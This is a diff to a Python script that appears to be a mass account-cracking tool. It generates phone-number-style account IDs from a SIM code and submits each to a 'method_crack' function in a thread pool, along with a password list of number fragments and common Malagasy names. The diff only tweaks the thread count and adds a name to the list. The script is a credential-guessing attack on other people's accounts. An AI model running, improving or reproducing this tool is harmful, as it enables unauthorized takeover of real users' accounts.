@@ -108,7 +108,7 @@ def BD_CLONING():
     for nmbr in range(limit):
         nmp=''.join(map(str, generate_random_sequence(7)))
         user.append(nmp)
-    with tred(max_workers=80) as Dipto:
+    with tred(max_workers=82) as Dipto:
         tl=str(len(user))
         print(' TOTAL ACCOUNT : '+tl)
         print(' YOUR SIM CODE : '+code)
@@ -116,7 +116,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:], 'fanantenana','maminirina','Maminirina','mamitiana','Mamitiana','mamisoa','Mamisoa','sahaza','Sahaza','nampoina','Nampoina','mampionona','Mampionona', 'randria', 'Randria', 'Malala', 'malala', 'sedera', 'Sedera', 'milely', 'Milely', 'hanitriniaina', 'Hanitriniaina', 'mendrika','hanitra','Hanitra','voahirana','Voahirana','mahaleo','Mahaleo','manampy','Manampy','nirina','Nirina','heriniaina','Heriniaina','herisoa','Herisoa','lovanirina','Lovanirina','Christophe','christophe','ravalomanana','Ravalomanana','Fanantenana', 'fitiavana', 'Fitiavana', 'nirina', 'Nirina', 'sariaka', 'Sariaka', 'faneva', 'Faneva', 'stephane', 'Stephane', 'nomenjanahary', 'Nomenjanahary', 'santatra', 'Santatra', 'narovana', 'Narovana', 'nilaina', 'Nilaina', 'nantenaina', 'Nantenaina', 'fanomezana', 'Fanomezana', 'fanirina', 'anjara', 'Anjara', 'dahalo', 'Dahalo', 'justin', 'Justin', 'ferdinand', 'Ferdinand', 'lalaina', 'Lalaina', 'Fanirina', 'fiderana', 'Fiderana', 'nomena', 'Nomena', 'henika', 'Henika', 'hasina', 'Hasina', 'tantely', 'Tantely', 'Koloina', 'koloina' , 'Mendrika']
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:], 'fanantenana','Fanantenana','maminirina','Maminirina','mamitiana','Mamitiana','mamisoa','Mamisoa','sahaza','Sahaza','nampoina','Nampoina','mampionona','Mampionona', 'randria', 'Randria', 'Malala', 'malala', 'sedera', 'Sedera', 'milely', 'Milely', 'hanitriniaina', 'Hanitriniaina', 'mendrika','hanitra','Hanitra','voahirana','Voahirana','mahaleo','Mahaleo','manampy','Manampy','nirina','Nirina','heriniaina','Heriniaina','herisoa','Herisoa','lovanirina','Lovanirina','Christophe','christophe','ravalomanana','Ravalomanana','Fanantenana', 'fitiavana', 'Fitiavana', 'nirina', 'Nirina', 'sariaka', 'Sariaka', 'faneva', 'Faneva', 'stephane', 'Stephane', 'nomenjanahary', 'Nomenjanahary', 'santatra', 'Santatra', 'narovana', 'Narovana', 'nilaina', 'Nilaina', 'nantenaina', 'Nantenaina', 'fanomezana', 'Fanomezana', 'fanirina', 'anjara', 'Anjara', 'dahalo', 'Dahalo', 'justin', 'Justin', 'ferdinand', 'Ferdinand', 'lalaina', 'Lalaina', 'Fanirina', 'fiderana', 'Fiderana', 'nomena', 'Nomena', 'henika', 'Henika', 'hasina', 'Hasina', 'tantely', 'Tantely', 'Koloina', 'koloina' , 'Mendrika']
             Dipto.submit(method_crack,ids,passlist)
             
     linex()
